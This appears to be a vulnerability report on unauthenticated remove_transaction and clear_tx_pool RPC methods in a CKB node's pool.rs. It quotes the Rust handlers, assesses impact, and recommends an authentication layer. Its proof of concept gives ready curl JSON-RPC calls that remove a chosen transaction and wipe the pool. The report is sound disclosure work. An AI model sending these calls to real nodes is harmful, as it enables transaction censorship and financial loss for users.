### Title
Unauthenticated `remove_transaction` and `clear_tx_pool` RPC Methods Allow Arbitrary Tx-Pool State Manipulation — (File: `rpc/src/module/pool.rs`)

---

### Summary

The `remove_transaction` and `clear_tx_pool` RPC methods in `rpc/src/module/pool.rs` perform zero caller authentication or authorization checks. Any entity that can reach the RPC endpoint — including any unprivileged RPC caller — can invoke them to silently remove individual transactions or wipe the entire transaction pool. The CKB RPC server has no built-in authentication mechanism whatsoever; the only protection is the default network binding to `127.0.0.1`, which operators routinely change.

---

### Finding Description

**Root cause — missing access control on state-mutating RPC handlers.**

`remove_transaction` at lines 662–669:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

`clear_tx_pool` at lines 684–692:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

Neither function checks who the caller is. There is no API key, no token, no signature, no IP allowlist enforced at the code level. The RPC trait definition (`PoolRpc`) exposes both methods unconditionally to any connected client. [1](#0-0) [2](#0-1) 

The downstream effect of `clear_tx_pool` is that `TxPool::clear` is called and the block assembler is reset: [3](#0-2) 

The RPC server has no authentication layer. The only guard is the configured `listen_address`, which defaults to `127.0.0.1:8114` but is trivially changed by operators and is explicitly documented as something operators do change: [4](#0-3) 

**Exploit flow:**

1. Attacker identifies a CKB node with the RPC port reachable (exposed to LAN/internet, or attacker has local access — both are listed as valid attacker profiles in `RESEARCHER.md`).
2. Attacker sends a single unauthenticated JSON-RPC call:
   - `{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}` — wipes all pending transactions.
   - `{"jsonrpc":"2.0","method":"remove_transaction","params":["<tx_hash>"],"id":1}` — silently removes a targeted transaction.
3. No credentials, no proof-of-work, no signature required.

---

### Impact Explanation

- **`clear_tx_pool`**: All unconfirmed transactions are evicted. Users must resubmit. Time-sensitive transactions (e.g., those with `since` lock constraints, or application-layer liquidations) silently expire or miss their window, causing direct financial loss to submitters. The miner operating the node loses all pending fee revenue from the pool.
- **`remove_transaction`**: Targeted censorship of a specific transaction. An attacker can repeatedly remove a victim's transaction every time it is resubmitted, permanently preventing it from being confirmed on that node and any peers that relay from it.
- Both attacks are silent — no error is returned to the transaction submitter; the transaction simply disappears.

Impact: **High** — permanent loss of pending transactions, targeted censorship with financial consequences, disruption of block assembly.

---

### Likelihood Explanation

- The RPC module `Pool` is enabled by default in the production config.
- The RPC server has zero authentication. Any caller who can reach the port succeeds.
- Operators routinely expose the RPC port for remote management, monitoring dashboards, and mining pool integrations. The documentation warns against this but does not enforce any restriction.
- The attack requires a single HTTP POST with no credentials. It is trivially scriptable and repeatable.

Likelihood: **Medium-High** — trivial to execute wherever the RPC port is reachable; reachability is the only barrier, and it is frequently absent in real deployments.

---

### Recommendation

1. **Add an authentication layer to the RPC server** — at minimum, a configurable bearer token or IP allowlist enforced in code, not just documentation.
2. **Separate privileged methods** (`clear_tx_pool`, `remove_transaction`, `clear_tx_verify_queue`) into a distinct RPC module (e.g., `Admin`) that is disabled by default and requires explicit opt-in with a separate, authenticated listen address.
3. **Rate-limit or disable `remove_transaction` and `clear_tx_pool`** on nodes that serve public RPC traffic.

---

### Proof of Concept

**Prerequisites:** A CKB node with the `Pool` RPC module enabled (default) and the RPC port reachable by the attacker.

**Step 1 — Submit a transaction to the target node:**
```bash
curl -X POST http://<node_ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"send_transaction","params":[<tx_json>],"id":1}'
# Returns: {"result": "<tx_hash>"}
```

**Step 2 — Remove it with no credentials:**
```bash
curl -X POST http://<node_ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction","params":["<tx_hash>"],"id":2}'
# Returns: {"result": true}
```

**Step 3 — Verify the pool is empty of that transaction:**
```bash
curl -X POST http://<node_ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false],"id":3}'
# Transaction hash is absent from the result.
```

**Step 4 — Wipe the entire pool:**
```bash
curl -X POST http://<node_ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":4}'
# Returns: {"result": null}
```

No authentication, no signature, no privileged key required at any step. The attack is repeatable indefinitely. [5](#0-4) [6](#0-5)

### Citations

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L349-350)
```rust
    #[rpc(name = "clear_tx_verify_queue")]
    fn clear_tx_verify_queue(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** tx-pool/src/process.rs (L916-930)
```rust
    pub(crate) async fn clear_pool(&mut self, new_snapshot: Arc<Snapshot>) {
        {
            let mut tx_pool = self.tx_pool.write().await;
            tx_pool.clear(Arc::clone(&new_snapshot));
        }
        // reset block_assembler
        if self
            .block_assembler_sender
            .send(BlockAssemblerMessage::Reset(new_snapshot))
            .await
            .is_err()
        {
            error!("block_assembler receiver dropped");
        }
    }
```

**File:** resource/ckb.toml (L181-183)
```text
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
```
